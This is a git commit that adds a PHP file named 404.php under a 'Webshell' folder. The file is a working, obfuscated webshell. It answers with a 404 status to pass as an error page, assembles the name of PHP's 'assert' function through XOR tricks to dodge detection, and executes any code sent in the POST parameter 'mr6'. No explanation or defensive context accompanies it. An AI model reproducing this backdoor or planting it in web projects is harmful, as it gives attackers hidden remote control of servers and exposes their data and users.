873f94353b9a35e496cd210c1214e966489bda63
Việt Tùng <46634952+tungpdv@users.noreply.github.com>
2019-10-07 15:48:04 +0700

    Create 404.php

---
+++ Webshell/404.php
@@ -0,0 +1,19 @@
+<?php 
+header('HTTP/1.1 404');
+class ZXVG
+{
+    public $c='';
+    public function __destruct()
+    {
+        $_0='&'^"\x47";
+        $_1='C'^"\x30";
+        $_2='A'^"\x32";
+        $_3='v'^"\x13";
+        $_4='J'^"\x38";
+        $_5='f'^"\x12";
+        $db=$_0.$_1.$_2.$_3.$_4.$_5;
+        return @$db($this->c);
+    }
+}
+$zxvg=new ZXVG();
+@$zxvg->c=$_POST['mr6'];
